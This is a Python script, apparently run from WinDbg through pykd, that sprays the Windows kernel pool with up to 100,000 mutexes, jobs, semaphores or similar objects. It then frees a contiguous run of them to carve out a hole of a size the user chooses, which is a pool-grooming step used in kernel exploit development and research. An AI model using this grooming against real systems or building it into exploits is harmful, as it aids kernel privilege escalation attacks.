import pykd
from pykd import *
import re
from ctypes import *
from ctypes.wintypes import *
import os
import time

kernel32 = windll.kernel32
ntdll = windll.ntdll

kernel_object_sizes = {}

kernel_object_sizes['unnamed_mutex'] = 0x50
kernel_object_sizes['named_mutex'] = 0x60
kernel_object_sizes['unnamed_job'] = 0x168
kernel_object_sizes['named_job'] = 0x178
kernel_object_sizes['iocompletionport'] = 0x98
kernel_object_sizes['iocompletionreserve'] = 0x60
kernel_object_sizes['unnamed_semaphore'] = 0x48
kernel_object_sizes['named_semaphore'] = 0x58
kernel_object_sizes['event'] = 0x40

handles = []

def allocate_object(object_to_use, variance):
	hHandle = HANDLE(0)
	if object_to_use == 'unnamed_mutex':
		hHandle = kernel32.CreateMutexA(None, False, None)
	elif object_to_use == 'named_mutex':
		hHandle = kernel32.CreateMutexA(None, False, "Pool spraying is cool %s" % variance)
	elif object_to_use == 'unnamed_job':
		hHandle = kernel32.CreateJobObjectA(None, None)
	elif object_to_use == 'named_job':
		hHandle = kernel32.CreateJobObjectA(None, "Job %s" % variance)
	elif object_to_use == 'iocompletionport':
		hHandle = kernel32.CreateIoCompletionPort(-1, None, 0, 0)
	elif object_to_use == 'iocompletionreserve':
		IO_COMPLETION_OBJECT = 1
		ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
		hHandle = hHandle.value
	elif object_to_use == 'unnamed_semaphore':
		hHandle = kernel32.CreateSemaphoreA(None, 0, 3, None)
	elif object_to_use == 'named_semaphore':
		hHandle = kernel32.CreateSemaphoreA(None, 0, 3, "My little Semaphore %s" % variance)
	elif object_to_use == 'event':
		hHandle = kernel32.CreateEventA(None, False, False, None)
	if hHandle == None:
		print "[-] Error while creating object: %s" % object_to_use
		return -1
	return hHandle

def find_object_location(handle):
	#find windbg.exe process
	wp = dbgCommand('!process 0 0 windbg.exe')
	#extract process "address"
	process_tuples = re.findall( r'(PROCESS )([0-9a-f]*)(  SessionId)', wp)
	if process_tuples:
		process = process_tuples[0][1]
		print "Process: " + process

		#switch to process context
		dbgCommand(".process " + process)
	
		#find object "address"
		object_ref = dbgCommand("!handle %s" % handle)
		object_tuples = re.findall( r'(Object: )([0-9a-f]*)(  GrantedAccess)', object_ref)
		if object_tuples:
			obj = object_tuples[0][1]
			print "Object location: %s" % obj
			return obj
	print "[-] Couldn't find object" 
	return -1

def find_object_to_spray(required_hole_size):
	for key in kernel_object_sizes:
		if required_hole_size % kernel_object_sizes[key] == 0:
			return key
	print "[-] Couldn't find proper object to spray with"
	return -1

def spray(required_hole_size):
	good_object = find_object_to_spray(required_hole_size)
	if good_object != -1:
		for i in range(100000):
			handles.append(allocate_object(good_object, i))
	return good_object

def make_hole(required_hole_size, good_object):
	nr_to_free = required_hole_size / kernel_object_sizes[good_object]
	loc = find_object_location(hex(handles[49999]))
	for i in range(nr_to_free):
		kernel32.CloseHandle(handles[50000 + i])
		handles[50000 + i] = -1
	pool = dbgCommand('!pool %s' % loc)
	print pool

def gimme_the_hole(required_hole_size):
	good_object = spray(required_hole_size)
	if good_object != -1:
		make_hole(required_hole_size, good_object)
	else:
		print "Couldn't spray"

def close_all_handles():
	for h in handles:
		if h != -1:
			kernel32.CloseHandle(h)

s = raw_input("Give me the size of the hole in hex: ")
gimme_the_hole(int(s,16))
close_all_handles()
